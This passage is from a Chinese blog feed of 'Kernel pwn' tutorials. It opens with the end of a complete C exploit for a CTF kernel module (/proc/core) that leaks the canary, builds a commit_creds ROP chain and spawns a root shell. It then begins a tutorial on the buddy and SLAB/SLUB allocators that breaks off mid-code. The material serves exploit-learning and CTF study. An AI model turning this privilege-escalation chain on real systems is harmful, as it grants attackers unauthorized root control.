nbytes)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">()</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">saveStatus</span><span class="params">()</span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">char</span>* buf)</span>&#123;</span><br><span class="line">ioctl(fd, <span class="number">0x6677889B</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">change_off</span><span class="params">(<span class="type">int</span> off)</span>&#123;</span><br><span class="line">ioctl(fd, <span class="number">0x6677889C</span>, off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy_func</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> nbytes)</span>&#123;</span><br><span class="line">ioctl(fd, <span class="number">0x6677889A</span>, nbytes);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// This function is used to get the addresses of two key functions from /tmp/kallsyms</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_function_address</span><span class="params">()</span>&#123;</span><br><span class="line">FILE* sym_table = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);<span class="comment">// including all address of kernel functions</span></span><br><span class="line"><span class="keyword">if</span>(sym_table == <span class="literal">NULL</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: Cannot open file \&quot;/tmp/kallsyms\&quot;\n\033[0m&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> addr = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> type[<span class="number">0x10</span>];</span><br><span class="line"><span class="type">char</span> func_name[<span class="number">0x100</span>];</span><br><span class="line"><span class="comment">// when the reading raises error, the function fscanf will return a zero, so that we know the file comes to its end.</span></span><br><span class="line"><span class="keyword">while</span>(<span class="built_in">fscanf</span>(sym_table, <span class="string">&quot;%llx%s%s&quot;</span>, &amp;addr, type, func_name))&#123;</span><br><span class="line"><span class="keyword">if</span>(commit_creds &amp;&amp; prepare_kernel_cred)<span class="comment">// two addresses of key functions are all found, return directly.</span></span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(func_name, <span class="string">&quot;commit_creds&quot;</span>))&#123;<span class="comment">// function &quot;commit_creds&quot; found</span></span><br><span class="line">commit_creds = addr;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Note: Address of function \&quot;commit_creds\&quot; found: \033[0m%#llx\n&quot;</span>, commit_creds);</span><br><span class="line">&#125;<span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(func_name, <span class="string">&quot;prepare_kernel_cred&quot;</span>))&#123;</span><br><span class="line">prepare_kernel_cred = addr;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Note: Address of function \&quot;prepare_kernel_cred\&quot; found: \033[0m%#llx\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// this is a universal function to print binary data from a char* array</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">print_binary</span><span class="params">(<span class="type">char</span>* buf, <span class="type">int</span> length)</span>&#123;</span><br><span class="line"><span class="type">int</span> index = <span class="number">0</span>;</span><br><span class="line"><span class="type">char</span> output_buffer[<span class="number">80</span>];</span><br><span class="line"><span class="built_in">memset</span>(output_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">80</span>);</span><br><span class="line"><span class="built_in">memset</span>(output_buffer, <span class="string">&#x27; &#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;(length % <span class="number">16</span> == <span class="number">0</span> ? length / <span class="number">16</span> : length / <span class="number">16</span> + <span class="number">1</span>); i++)&#123;</span><br><span class="line"><span class="type">char</span> temp_buffer[<span class="number">0x10</span>];</span><br><span class="line"><span class="built_in">memset</span>(temp_buffer, <span class="string">&#x27;\0&#x27;</span>, <span class="number">0x10</span>);</span><br><span class="line"><span class="built_in">sprintf</span>(temp_buffer, <span class="string">&quot;%#5x&quot;</span>, index);</span><br><span class="line"><span class="built_in">strcpy</span>(output_buffer, temp_buffer);</span><br><span class="line">output_buffer[<span class="number">5</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">output_buffer[<span class="number">6</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">output_buffer[<span class="number">7</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> j=<span class="number">0</span>; j&lt;<span class="number">16</span>; j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(index+j &gt;= length)</span><br><span class="line"><span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;   &quot;</span>);</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">sprintf</span>(output_buffer+<span class="number">8</span>+<span class="number">3</span>*j, <span class="string">&quot;%02x &quot;</span>, ((<span class="type">int</span>)buf[index+j]) &amp; <span class="number">0xFF</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="built_in">isprint</span>(buf[index+j]))</span><br><span class="line">output_buffer[<span class="number">58</span>+j] = <span class="string">&#x27;.&#x27;</span>;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">output_buffer[<span class="number">58</span>+j] = buf[index+j];</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">output_buffer[<span class="number">55</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line">output_buffer[<span class="number">56</span>] = <span class="string">&#x27;|&#x27;</span>;</span><br><span class="line">output_buffer[<span class="number">57</span>] = <span class="string">&#x27; &#x27;</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, output_buffer);</span><br><span class="line"><span class="built_in">memset</span>(output_buffer+<span class="number">58</span>, <span class="string">&#x27;\0&#x27;</span>, <span class="number">16</span>);</span><br><span class="line">index += <span class="number">16</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">shell</span><span class="params">()</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(getuid())&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: Failed to get root, exiting......\n\033[0m&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[32m\033[1m[+] Getting the root......\033[0m\n&quot;</span>);</span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">saveStatus();</span><br><span class="line">fd = open(<span class="string">&quot;/proc/core&quot;</span>, <span class="number">2</span>);<span class="comment">// open the process</span></span><br><span class="line"><span class="keyword">if</span>(!fd)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[31m\033[1m[x] Error: Cannot open process \&quot;core\&quot;\n\033[0m&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">char</span> buffer[<span class="number">0x100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">get_function_address();<span class="comment">// get addresses of two key function</span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> base_offset = commit_creds - commit_creds_base;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] KASLR offset: \033[0m%#llx\n&quot;</span>, base_offset);</span><br><span class="line"></span><br><span class="line">change_off(<span class="number">0x40</span>);<span class="comment">// change the offset so that we can get canary later</span></span><br><span class="line">core_read(buffer);<span class="comment">// get canary</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Contents in buffer here:\033[0m\n&quot;</span>);<span class="comment">// print content in buffer</span></span><br><span class="line">print_binary(buffer, <span class="number">0x40</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> canary = ((<span class="type">size_t</span>*)&amp;buffer)[<span class="number">0</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[35m\033[1m[*] The value of canary is the first 8 bytes: \033[0m%#llx\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> ROP[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="built_in">memset</span>(ROP, <span class="number">0</span>, <span class="number">800</span>);</span><br><span class="line"><span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++)</span><br><span class="line">ROP[idx++] = canary;</span><br><span class="line">ROP[idx++] = poprdi_ret + base_offset;</span><br><span class="line">ROP[idx++] = <span class="number">0</span>;<span class="comment">// rdi -&gt; 0</span></span><br><span class="line">ROP[idx++] = prepare_kernel_cred;</span><br><span class="line">ROP[idx++] = poprdx_ret + base_offset;</span><br><span class="line">ROP[idx++] = poprcx_ret + base_offset;</span><br><span class="line">ROP[idx++] = movrdirax_callrdx + base_offset;</span><br><span class="line">ROP[idx++] = commit_creds;</span><br><span class="line">ROP[idx++] = swapgs_popfq_ret + base_offset;<span class="comment">// step 1 of returning to user mode: swapgs</span></span><br><span class="line">ROP[idx++] = <span class="number">0</span>;</span><br><span class="line">ROP[idx++] = iretq + base_offset;<span class="comment">// step 2 of returning to user mode: iretq</span></span><br><span class="line"><span class="comment">// after the iretq: return address, user cs, user rflags, user sp, user ss</span></span><br><span class="line">ROP[idx++] = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)shell;</span><br><span class="line">ROP[idx++] = user_cs;</span><br><span class="line">ROP[idx++] = user_rflags;</span><br><span class="line">ROP[idx++] = user_sp;</span><br><span class="line">ROP[idx++] = user_ss;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Our rop chain looks like: \033[0m\n&quot;</span>);</span><br><span class="line">print_binary((<span class="type">char</span>*)ROP, <span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">write(fd, ROP, <span class="number">0x800</span>);</span><br><span class="line">core_copy_func(<span class="number">0xffffffffffff1000</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译时注意加上静态编译<code>--static</code>和<code>-masm=intel</code>选项。打包后运行start.sh，如果出现内核恐慌，则将分配的内存增加一倍再进行尝试。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Kernel pwn 入门 (8)</title>
      <link href="/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-8/"/>
      <url>/2023/02/28/Kernel-pwn-%E5%85%A5%E9%97%A8-8/</url>
      
        <content type="html"><![CDATA[<p>在本篇文章中笔者不打算分析题目，而是对Linux中的slub系统进行深入的学习与分析。</p><p>参考资料：上一篇文章中提到的三篇与kernel内存分配有关的文章。在阅读本文时，建议与这三篇文章对照食用。</p><h1 id="1-伙伴系统重温"><a href="#1-伙伴系统重温" class="headerlink" title="1. 伙伴系统重温"></a>1. 伙伴系统重温</h1><p>slub作为小块内存的分配器，其在伙伴系统之下运作，因此首先我们还是来回顾一下伙伴系统。</p><p>在第4篇文章中，我们简单介绍了伙伴系统的运作机理，以页为单位进行大块内存空间的分配与释放。其具体的数据结构如下图所示：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 伙伴系统的一个块，描述1,2,4,8,16,32,64,128,256,512或1024个连续页框的块 */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">free_area</span> &#123;</span></span><br><span class="line">    <span class="comment">/* 指向这个块中所有空闲小块的第一个页描述符，这些小块会按照MIGRATE_TYPES类型存放在不同指针里 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">free_list</span>[<span class="title">MIGRATE_TYPES</span>];</span></span><br><span class="line">    <span class="comment">/* 空闲小块的个数 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span>        nr_free;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><font color=red><strong>需要注意的是，伙伴系统并不是内核内存分配系统中最上层的结构，在其上还有其他的结构，但在Kernel pwn中我们对更为上层的结构接触较少，因此这里只介绍到伙伴系统。</strong></font></p><p>上图的<code>free_area</code>表示一系列页的链表的数组。而在Linux系统内核中，一共有11个这样的<code>free_area</code>，分别保存所有大小为1,2,4,8,16,32,64,128,256,512,1024个页大小的内存空间（这些空间都是连续的），在<code>free_area</code>中，<code>free_list</code>是一系列这样的内存空间组成的链表的数组，内含多个链表，这些链表中的内存空间大小相同，但属性不同，对于<code>MIGRATE_TYPES</code>的定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">migratetype</span> &#123;</span></span><br><span class="line">MIGRATE_UNMOVABLE,</span><br><span class="line">MIGRATE_MOVABLE,</span><br><span class="line">MIGRATE_RECLAIMABLE,</span><br><span class="line">MIGRATE_PCPTYPES,<span class="comment">/* the number of types on the pcp lists */</span></span><br><span class="line">MIGRATE_HIGHATOMIC = MIGRATE_PCPTYPES,</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_CMA</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * MIGRATE_CMA migration type is designed to mimic the way</span></span><br><span class="line"><span class="comment"> * ZONE_MOVABLE works.  Only movable pages can be allocated</span></span><br><span class="line"><span class="comment"> * from MIGRATE_CMA pageblocks and page allocator never</span></span><br><span class="line"><span class="comment"> * implicitly change migration type of MIGRATE_CMA pageblock.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The way to use it is to change migratetype of a range of</span></span><br><span class="line"><span class="comment"> * pageblocks to MIGRATE_CMA which can be done by</span></span><br><span class="line"><span class="comment"> * __free_pageblock_cma() function.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">MIGRATE_CMA,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMORY_ISOLATION</span></span><br><span class="line">MIGRATE_ISOLATE,<span class="comment">/* can&#x27;t allocate from here */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">MIGRATE_TYPES</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>这里定义了链表中内存块的属性：</p><blockquote><p>linux为了防止内存中产生过多的碎片，一般把页的类型分为三种：<br>不可移动页：在内存中有固定位置，不能移动到其他地方。内核中使用的页大部分是属于这种类型。<br>可回收页：不能直接移动，但可以删除，页中的内容可以从某些源中重新生成。例如，页内容是映射到文件数据的页就属于这种类型。对于这种类型，在内存短缺(分配失败)时，会发起内存回收，将这类型页进行回写释放。<br>可移动页：可随意移动，用户空间的进程使用的没有映射具体磁盘文件的页就属于这种类型(比如堆、栈、shmem共享内存、匿名mmap共享内存)，它们是通过进程页表映射的，把这些页复制到新位置时，只要更新进程页表就可以了。一般这些页是从高端内存管理区获取。</p></blockquote><p>上面的每一个链表中保存的所有内存块的属性都是一样的。因此总的来看，伙伴系统可以表示为下图所示的结构：</p><p><img src="https://img-blog.csdnimg.cn/a2449f904a104a21b31956db5e72003c.png"><br>其中枚举类型具体的含义我们只需要了解即可，在Kernel pwn中我们应该应对的最多的还是SLAB和SLUB系统。虽然SLAB系统正逐渐被SLUB替换，但还是有必要进行了解。</p><h1 id="2-SLAB系统介绍"><a href="#2-SLAB系统介绍" class="headerlink" title="2. SLAB系统介绍"></a>2. SLAB系统介绍</h1><p>SLAB分配器建立在伙伴系统基础上，由于参考资料年代较为久远，部分源码与最近的Linux内核源码差距较大，因此不做解释，但影响不大。</p><p>在SLAB中，我们将可分配的内存块称之为<font color=red><strong>对象</strong></font>，一个分配器由结构体<code>kmem_cache</code>描述，结构如下（选自Linux 5.18.19版本内核）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">array_cache</span> __<span class="title">percpu</span> *<span class="title">cpu_cache</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 1) Cache tunables. Protected by slab_mutex */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> batchcount;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> limit;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> shared;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> size;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">reciprocal_value</span> <span class="title">reciprocal_buffer_size</span>;</span></span><br><span class="line"><span class="comment">/* 2) touched by every alloc &amp; free from the backend */</span></span><br><span class="line"></span><br><span class="line"><span class="type">slab_flags_t</span> flags;<span class="comment">/* constant flags */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> num;<span class="comment">/* # of objs per slab */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 3) cache_grow/shrink */</span></span><br><span class="line"><span class="comment">/* order of pgs per slab (2^n) */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> gfporder;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* force GFP flags, e.g. GFP_DMA */</span></span><br><span class="line"><span class="type">gfp_t</span> allocflags;</span><br><span class="line"></span><br><span class="line"><span class="type">size_t</span> colour;<span class="comment">/* cache colouring range */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> colour_off;<span class="comment">/* colour offset */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">freelist_cache</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> freelist_size;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* constructor func */</span></span><br><span class="line"><span class="type">void</span> (*ctor)(<span class="type">void</span> *obj);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 4) cache creation/removal */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line"><span class="type">int</span> refcount;</span><br><span class="line"><span class="type">int</span> object_size;</span><br><span class="line"><span class="type">int</span> align;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 5) statistics */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_DEBUG_SLAB</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> num_active;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> num_allocations;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> high_mark;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> grown;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> reaped;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> errors;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> max_freeable;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> node_allocs;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> node_frees;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> node_overflow;</span><br><span class="line"><span class="type">atomic_t</span> allochit;</span><br><span class="line"><span class="type">atomic_t</span> allocmiss;</span><br><span class="line"><span class="type">atomic_t</span> freehit;</span><br><span class="line"><span class="type">atomic_t</span> freemiss;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If debugging is enabled, then the allocator can add additional</span></span><br><span class="line"><span class="comment"> * fields and/or padding to every object. &#x27;size&#x27; contains the total</span></span><br><span class="line"><span class="comment"> * object size including these internal fields, while &#x27;obj_offset&#x27;</span></span><br><span class="line"><span class="comment"> * and &#x27;object_size&#x27; contain the offset to the user object and its</span></span><br><span class="line"><span class="comment"> * size.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> obj_offset;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_DEBUG_SLAB */</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_KASAN</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kasan_cache</span> <span class="title">kasan_info</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB_FREELIST_RANDOM</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> *random_seq;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> useroffset;<span class="comment">/* Usercopy region offset */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> usersize;<span class="comment">/* Usercopy region size */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">node</span>[<span class="title">MAX_NUMNODES</span>];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>其中<code>kmem_cache_node *node[MAX_NUMNODES]</code>中就保存有SLAB分配器中的一些核心结构，这里的<code>MAX_NUMNODES</code>在x86-64架构下的值为64：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> &#123;</span></span><br><span class="line"><span class="type">spinlock_t</span> list_lock;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLAB</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slabs_partial</span>;</span><span class="comment">/* partial list first, better asm code */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slabs_full</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">slabs_free</span>;</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> total_slabs;<span class="comment">/* length of all slab lists */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> free_slabs;<span class="comment">/* length of free slab list only */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> free_objects;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> free_limit;</span><br><span class="line"><span class="type">unsigned</span> <span class="type">int</span> colour_next;<span class="comment">/* Per-node cache coloring */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">array_cache</span> *<span class="title">shared</span>;</span><span class="comment">/* shared per node */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alien_cache</span> **<span class="title">alien</span>;</span><span class="comment">/* on other nodes */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> next_reap;<span class="comment">/* updated without locking */</span></span><br><span class="line"><span class="type">int</span> free_touched;<span class="comment">/* updated without locking */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">long</span> nr_partial;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">partial</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SLUB_DEBUG</span></span><br><span class="line"><span class="type">atomic_long_t</span> nr_slabs;</span><br><span class="line"><span class="type">atomic_long_t</span> total_objects;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">full</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span 